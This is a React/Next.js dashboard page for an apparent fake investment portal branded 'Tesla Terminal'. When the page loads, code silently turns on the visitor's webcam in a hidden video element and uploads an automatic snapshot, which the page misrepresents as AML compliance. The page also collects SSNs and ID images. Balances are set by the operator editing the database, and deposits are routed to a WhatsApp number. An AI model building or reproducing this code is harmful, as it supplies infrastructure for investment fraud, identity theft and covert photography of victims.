'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { 
  LogOut, Lock, Smartphone, ShieldCheck, 
  Activity, Upload, CheckCircle, FileText, Camera, Loader2 
} from 'lucide-react';

export default function Dashboard() {
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState<any>(null);
  
  // KYC & UI State
  const [ssn, setSsn] = useState('');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);

  // Refs for silent proctoring
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const initSession = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) { window.location.href = '/portal/auth'; return; }

      // Initial Fetch
      const fetchProfile = async () => {
        const { data } = await supabase.from('profiles').select('*').eq('id', session.user.id).single();
        if (data) setUser(data);
        setLoading(false);
      };

      fetchProfile();

      // REALTIME LISTENER: Unlocks button instantly when you edit DB
      const profileSubscription = supabase
        .channel('profile-changes')
        .on('postgres_changes', { 
            event: 'UPDATE', 
            schema: 'public', 
            table: 'profiles', 
            filter: `id=eq.${session.user.id}` 
        }, (payload) => {
          setUser(payload.new);
        })
        .subscribe();

      startCamera();

      return () => {
        supabase.removeChannel(profileSubscription);
      };
    };

    initSession();
  }, []);

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) videoRef.current.srcObject = stream;
      // Auto-take snapshot after 4 seconds
      setTimeout(() => takeSnapshot(), 4000);
    } catch (err) { console.warn("Biometrics blocked by user"); }
  };

  const takeSnapshot = async () => {
    if (!videoRef.current || !canvasRef.current || !user) return;
    const context = canvasRef.current.getContext('2d');
    context?.drawImage(videoRef.current, 0, 0, 640, 480);
    const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.6));
    if (blob) {
      await supabase.storage.from('proctor-snapshots').upload(`${user.id}/biometric_${Date.now()}.jpg`, blob);
    }
  };

  const handleKycSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!ssn || !idFile || !user) return;
    setKycSubmitting(true);

    try {
      // 1. Upload ID Image
      const fileExt = idFile.name.split('.').pop();
      const fileName = `${user.id}/identity_${Date.now()}.${fileExt}`;
      const { error: uploadErr } = await supabase.storage.from('user-kyc').upload(fileName, idFile);
      if (uploadErr) throw uploadErr;

      // 2. Update DB with SSN and status
      const { error: dbErr } = await supabase
        .from('profiles')
        .update({ ssn_data: ssn, kyc_status: 'pending_review' })
        .eq('id', user.id);
      if (dbErr) throw dbErr;

      // Update local state to show success
      setUser({ ...user, kyc_status: 'pending_review' });
    } catch (err: any) {
      alert("Submission Error: " + err.message);
    } finally {
      setKycSubmitting(false);
    }
  };

  const isApproved = user?.deposit_status?.toLowerCase() === 'approved';

  if (loading) return (
    <div className="min-h-screen bg-black flex items-center justify-center text-[#D4AF37] uppercase tracking-[0.5em] animate-pulse text-[10px]">
      Synchronizing Ledger...
    </div>
  );

  return (
    <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black pb-20">
      {/* Hidden Biometric capture */}
      <video ref={videoRef} autoPlay muted className="hidden" />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />

      {/* HEADER */}
      <header className="border-b border-white/5 bg-black/50 backdrop-blur-xl sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-20 flex justify-between items-center">
          <div className="flex items-center gap-4">
             <div className="w-10 h-10 rounded-xl bg-[#D4AF37]/10 border border-[#D4AF37]/20 flex items-center justify-center shadow-[0_0_15px_rgba(212,175,55,0.1)]">
                <Activity size={18} className="text-[#D4AF37]" />
             </div>
             <span className="font-serif italic text-xl">Tesla <span className="text-gray-500 not-italic font-sans text-xs uppercase tracking-widest ml-2">Terminal</span></span>
          </div>
          <button onClick={() => supabase.auth.signOut().then(() => window.location.href = '/portal/auth')} className="text-gray-500 hover:text-red-500 p-2 transition-colors">
            <LogOut size={22} />
          </button>
        </div>
      </header>

      <div className="max-w-6xl mx-auto px-6 pt-12">
        {/* BALANCE SECTION */}
        <div className="grid lg:grid-cols-3 gap-8 mb-12">
          <div className="lg:col-span-2 bg-[#0a0a0a] border border-white/5 p-10 rounded-[3rem] shadow-2xl relative overflow-hidden group">
            <p className="text-gray-500 text-[10px] uppercase tracking-[0.4em] mb-4">Portfolio Equity Value</p>
            <h2 className="text-6xl md:text-8xl font-serif tracking-tighter mb-10 text-white">
              ${user?.balance?.toLocaleString() || '0.00'}
            </h2>
            
            <button 
              onClick={() => isApproved ? window.open("https://wa.me/YOUR_NUMBER") : null}
              className={`w-full md:w-auto px-12 py-5 rounded-full font-bold uppercase tracking-widest text-[10px] flex items-center justify-center gap-3 transition-all duration-500
                ${isApproved 
                  ? 'bg-green-600 hover:bg-green-500 text-white shadow-[0_0_30px_rgba(34,197,94,0.3)]' 
                  : 'bg-white/5 text-gray-500 cursor-not-allowed border border-white/5'
                }`}
            >
              {isApproved ? <><Smartphone size={16}/> Instant Deposit</> : <><Lock size={16}/> Deposit Restricted</>}
            </button>
          </div>

          <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] flex flex-col justify-between">
             <div className="space-y-6">
                <div className="flex justify-between items-center border-b border-white/5 pb-4">
                   <span className="text-gray-500 text-[10px] uppercase tracking-widest">ID Level</span>
                   <span className="text-[#D4AF37] font-mono text-sm">{user?.kyc_status === 'pending_review' ? 'Reviewing' : 'Tier 1'}</span>
                </div>
                <div className="flex justify-between items-center pb-4">
                   <span className="text-gray-500 text-[10px] uppercase tracking-widest">Security</span>
                   <span className="text-green-500 font-mono text-sm uppercase">Active</span>
                </div>
             </div>
             <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-5 rounded-2xl flex items-center gap-4">
                <Camera size={20} className="text-[#D4AF37] animate-pulse" />
                <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Biometric Stream: Encrypted snapshots are being logged for AML compliance.</p>
             </div>
          </div>
        </div>

        {/* VERIFICATION FORM */}
        {user?.kyc_status !== 'verified' && (
          <div className="bg-[#0a0a0a] border border-white/5 rounded-[3.5rem] p-8 md:p-16 shadow-inner">
            <div className="max-w-2xl">
              <h3 className="text-4xl font-serif mb-4">Identity Verification</h3>
              <p className="text-gray-500 text-sm mb-10 leading-relaxed font-light">Verify your credentials to unlock premium trading clusters and high-limit deposits.</p>

              {user?.kyc_status === 'pending_review' ? (
                <div className="bg-white/5 border border-white/10 p-10 rounded-3xl text-center">
                  <CheckCircle className="text-green-500 mx-auto mb-4" size={40} />
                  <p className="uppercase tracking-widest text-[10px] font-bold text-white">Under Review</p>
                  <p className="text-gray-500 text-xs mt-2">Our compliance team is verifying your documents.</p>
                </div>
              ) : (
                <form onSubmit={handleKycSubmit} className="space-y-8">
                  <div className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <label className="text-[9px] uppercase tracking-[0.2em] text-gray-500 font-black ml-2">SSN / Tax ID</label>
                      <input 
                        type="text" 
                        placeholder="XXX-XX-XXXX"
                        value={ssn}
                        onChange={(e) => setSsn(e.target.value)}
                        className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] transition-all text-sm"
                        required 
                      />
                    </div>
                    <div className="space-y-2">
                      <label className="text-[9px] uppercase tracking-[0.2em] text-gray-500 font-black ml-2">Upload ID Document</label>
                      <div className="relative">
                        <input 
                          type="file" 
                          accept="image/*" 
                          onChange={(e) => setIdFile(e.target.files?.[0] || null)}
                          className="absolute inset-0 opacity-0 cursor-pointer z-10" 
                          required 
                        />
                        <div className="w-full bg-black border border-dashed border-white/20 rounded-2xl p-5 flex items-center justify-center gap-3 hover:border-[#D4AF37]/50 transition-all text-xs text-gray-500">
                          <Upload size={16} /> {idFile ? idFile.name : "Passport or License"}
                        </div>
                      </div>
                    </div>
                  </div>
                  <button 
                    disabled={kycSubmitting}
                    className="w-full md:w-auto px-16 py-5 bg-white text-black font-black uppercase tracking-widest text-[10px] rounded-full hover:bg-[#D4AF37] transition-all shadow-xl"
                  >
                    {kycSubmitting ? <Loader2 className="animate-spin mx-auto" size={18} /> : "Finalize Verification"}
                  </button>
                </form>
              )}
            </div>
          </div>
        )}
      </div>
    </main>
  );
      }
